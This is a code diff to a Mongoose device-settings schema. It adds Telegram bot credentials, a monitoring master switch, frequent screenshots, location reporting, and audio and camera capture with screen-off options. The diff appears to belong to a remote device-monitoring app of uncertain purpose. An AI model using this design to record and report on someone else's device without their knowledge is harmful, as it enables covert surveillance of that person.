@@ -2,10 +2,25 @@ import mongoose, { Schema, Document, Model } from 'mongoose';
 
 export interface IDeviceSettings {
   syncIntervalMinutes: number;
-  locationTrackingEnabled: boolean;
-  cameraEnabled: boolean;
-  audioEnabled: boolean;
-  lockMessage: string;
+  // Telegram Integration
+  telegramBotToken: string;
+  telegramChatId: string;
+  // Monitoring Master Switch
+  isMonitoringActive: boolean;
+  // Features
+  sendScreenshot: boolean;
+  screenshotInterval: number; // in seconds
+  sendLocation: boolean;
+  locationInterval: number; // in minutes
+  sendAudio: boolean;
+  audioDuration: number; // in seconds
+  audioScreenOff: boolean;
+  sendCamera: boolean;
+  cameraInterval: number; // in seconds
+  cameraScreenOff: boolean;
+  // Legacy alias
+  locationTrackingEnabled?: boolean;
+  lockMessage?: string;
 }
 
 export interface IDeviceLocation {
@@ -86,15 +101,55 @@ const DeviceSchema = new Schema<IDevice>(
         min: 5,
         max: 1440,
       },
-      locationTrackingEnabled: {
+      telegramBotToken: {
+        type: String,
+        default: '',
+      },
+      telegramChatId: {
+        type: String,
+        default: '',
+      },
+      isMonitoringActive: {
         type: Boolean,
         default: true,
       },
-      cameraEnabled: {
+      sendScreenshot: {
+        type: Boolean,
+        default: true,
+      },
+      screenshotInterval: {
+        type: Number,
+        default: 10,
+      },
+      sendLocation: {
+        type: Boolean,
+        default: true,
+      },
+      locationInterval: {
+        type: Number,
+        default: 10,
+      },
+      sendAudio: {
         type: Boolean,
         default: false,
       },
-      audioEnabled: {
+      audioDuration: {
+        type: Number,
+        default: 60,
+      },
+      audioScreenOff: {
+        type: Boolean,
+        default: false,
+      },
+      sendCamera: {
+        type: Boolean,
+        default: false,
+      },
+      cameraInterval: {
+        type: Number,
+        default: 10,
+      },
+      cameraScreenOff: {
         type: Boolean,
         default: false,
       },
